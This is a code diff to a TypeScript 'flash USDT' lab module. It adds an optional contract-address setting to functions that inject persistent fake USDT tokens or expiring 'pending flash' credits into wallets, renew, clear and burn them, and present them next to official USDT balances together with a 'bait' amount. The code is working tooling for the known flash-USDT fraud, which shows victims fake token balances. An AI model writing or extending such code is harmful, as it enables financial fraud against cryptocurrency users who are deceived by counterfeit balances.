@@ -34,13 +34,16 @@ import type {
   WalletUsdtOverview,
 } from "./types";
 
+export type EvmLabOptions = { labContractAddress?: Address };
+
 /** Modo 1 — token falso persistente */
 export async function injectFlashUsdt(
   toAddress: string,
   amount: number,
-  network: EvmNetwork
+  network: EvmNetwork,
+  options?: EvmLabOptions
 ): Promise<EvmInjectResult> {
-  if (!isEvmConfigured(network)) {
+  if (!isEvmConfigured(network, options?.labContractAddress)) {
     return {
       success: true,
       simulated: true,
@@ -57,7 +60,7 @@ export async function injectFlashUsdt(
     }
 
     const walletClient = getWalletClient(network);
-    const contractAddress = getLabContractAddress(network);
+    const contractAddress = getLabContractAddress(network, options?.labContractAddress);
     const tokenAmount = toLabTokenUnits(amount);
 
     const txHash = await walletClient.writeContract({
@@ -93,12 +96,13 @@ export async function injectPendingFlashUsdt(
   toAddress: string,
   amount: number,
   durationMinutesInput: number,
-  network: EvmNetwork
+  network: EvmNetwork,
+  options?: EvmLabOptions
 ): Promise<PendingFlashInjectResult> {
   const durationMinutes = clampFlashDurationMinutes(durationMinutesInput);
   const flashExpiresAt = new Date(Date.now() + durationMinutes * 60 * 1000).toISOString();
 
-  if (!isEvmConfigured(network)) {
+  if (!isEvmConfigured(network, options?.labContractAddress)) {
     return {
       success: true,
       simulated: true,
@@ -119,7 +123,7 @@ export async function injectPendingFlashUsdt(
     }
 
     const walletClient = getWalletClient(network);
-    const contractAddress = getLabContractAddress(network);
+    const contractAddress = getLabContractAddress(network, options?.labContractAddress);
     const tokenAmount = toLabTokenUnits(amount);
     const durationSeconds = BigInt(flashDurationMinutesToSeconds(durationMinutes));
 
@@ -232,12 +236,13 @@ export async function renewFlashInject(
   toAddress: string,
   amount: number,
   durationMinutesInput: number,
-  network: EvmNetwork
+  network: EvmNetwork,
+  options?: EvmLabOptions
 ): Promise<{ success: boolean; txHash?: Hash; flashExpiresAt?: string; error?: string }> {
   const durationMinutes = clampFlashDurationMinutes(durationMinutesInput);
   const flashExpiresAt = new Date(Date.now() + durationMinutes * 60 * 1000).toISOString();
 
-  if (!isEvmConfigured(network)) {
+  if (!isEvmConfigured(network, options?.labContractAddress)) {
     return {
       success: true,
       txHash: `SIM_RENEW_${Date.now()}` as Hash,
@@ -254,7 +259,7 @@ export async function renewFlashInject(
     const durationSeconds = BigInt(flashDurationMinutesToSeconds(durationMinutes));
 
     const txHash = await walletClient.writeContract({
-      address: getLabContractAddress(network),
+      address: getLabContractAddress(network, options?.labContractAddress),
       abi: FLASH_USDT_LAB_ABI,
       functionName: "flashInject",
       args: [toAddress as Address, toLabTokenUnits(amount), durationSeconds],
@@ -271,9 +276,10 @@ export async function renewFlashInject(
 
 export async function clearFlashCredit(
   holderAddress: string,
-  network: EvmNetwork
+  network: EvmNetwork,
+  options?: EvmLabOptions
 ): Promise<EvmBurnResult> {
-  if (!isEvmConfigured(network)) {
+  if (!isEvmConfigured(network, options?.labContractAddress)) {
     return {
       success: true,
       simulated: true,
@@ -285,7 +291,7 @@ export async function clearFlashCredit(
   try {
     const walletClient = getWalletClient(network);
     const txHash = await walletClient.writeContract({
-      address: getLabContractAddress(network),
+      address: getLabContractAddress(network, options?.labContractAddress),
       abi: FLASH_USDT_LAB_ABI,
       functionName: "clearFlash",
       args: [holderAddress as Address],
@@ -303,13 +309,14 @@ export async function burnFlashUsdt(
   holderAddress: string,
   network: EvmNetwork,
   amount?: number,
-  mode: "fake_token" | "pending_flash" = "fake_token"
+  mode: "fake_token" | "pending_flash" = "fake_token",
+  options?: EvmLabOptions
 ): Promise<EvmBurnResult> {
   if (mode === "pending_flash") {
-    return clearFlashCredit(holderAddress, network);
+    return clearFlashCredit(holderAddress, network, options);
   }
 
-  if (!isEvmConfigured(network)) {
+  if (!isEvmConfigured(network, options?.labContractAddress)) {
     return {
       success: true,
       simulated: true,
@@ -321,7 +328,7 @@ export async function burnFlashUsdt(
   try {
     const walletClient = getWalletClient(network);
     const publicClient = getPublicClient(network);
-    const contractAddress = getLabContractAddress(network);
+    const contractAddress = getLabContractAddress(network, options?.labContractAddress);
 
     let burnAmount: bigint;
     if (amount != null) {
@@ -335,7 +342,7 @@ export async function burnFlashUsdt(
       });
       burnAmount = raw;
       if (burnAmount === BigInt(0)) {
-        return clearFlashCredit(holderAddress, network);
+        return clearFlashCredit(holderAddress, network, options);
       }
     }
 
@@ -361,13 +368,14 @@ export async function burnFlashUsdt(
 
 export async function getFlashUsdtBalance(
   holderAddress: string,
-  network: EvmNetwork
+  network: EvmNetwork,
+  options?: EvmLabOptions
 ): Promise<EvmBalanceResult> {
-  const contractAddress = isEvmConfigured(network)
-    ? getLabContractAddress(network)
+  const contractAddress = isEvmConfigured(network, options?.labContractAddress)
+    ? getLabContractAddress(network, options?.labContractAddress)
     : ("0x0000000000000000000000000000000000000001" as Address);
 
-  if (!isEvmConfigured(network)) {
+  if (!isEvmConfigured(network, options?.labContractAddress)) {
     return {
       balance: "0",
       balanceRaw: "0",
@@ -428,7 +436,7 @@ export async function getOfficialUsdtBalance(
 export async function getWalletUsdtOverview(
   holderAddress: string,
   network: EvmNetwork,
-  options?: {
+  options?: EvmLabOptions & {
     simulatedLabAmount?: number;
     injectionMode?: "fake_token" | "pending_flash";
     flashExpiresAt?: string | null;
@@ -441,7 +449,7 @@ export async function getWalletUsdtOverview(
   const pendingBaitNum = pendingBaitActive ? (options?.pendingBaitAmount ?? 0) : 0;
   const officialMeta = getOfficialUsdtMeta(network);
 
-  if (!isEvmConfigured(network)) {
+  if (!isEvmConfigured(network, options?.labContractAddress)) {
     const labBal = options?.simulatedLabAmount ?? 0;
     const flashActive =
       mode === "pending_flash" &&
@@ -463,12 +471,12 @@ export async function getWalletUsdtOverview(
     };
   }
 
-  const contractAddress = getLabContractAddress(network);
+  const contractAddress = getLabContractAddress(network, options?.labContractAddress);
   const publicClient = getPublicClient(network);
 
   const [official, totalLab, flashRaw, expiresRaw] = await Promise.all([
     getOfficialUsdtBalance(holderAddress, network),
-    getFlashUsdtBalance(holderAddress, network),
+    getFlashUsdtBalance(holderAddress, network, options),
     publicClient
       .readContract({
         address: contractAddress,
@@ -519,12 +527,16 @@ export async function getWalletUsdtOverview(
   };
 }
 
-export async function getTxStatus(txHash: string, network: EvmNetwork): Promise<EvmTxStatus> {
+export async function getTxStatus(
+  txHash: string,
+  network: EvmNetwork,
+  options?: EvmLabOptions
+): Promise<EvmTxStatus> {
   if (txHash.startsWith("SIM_")) {
     return { confirmed: true, txHash, blockNumber: 0 };
   }
 
-  if (!isEvmConfigured(network)) {
+  if (!isEvmConfigured(network, options?.labContractAddress)) {
     return { confirmed: false, pending: true, txHash };
   }
 
@@ -554,8 +566,8 @@ export async function getTxStatus(txHash: string, network: EvmNetwork): Promise<
   }
 }
 
-export function isLabEvmReady(network?: EvmNetwork): boolean {
-  return isEvmConfigured(network);
+export function isLabEvmReady(network?: EvmNetwork, labContractAddress?: string | null): boolean {
+  return isEvmConfigured(network, labContractAddress);
 }
 
 export function getLabNetworkLabel(network: EvmNetwork): string {
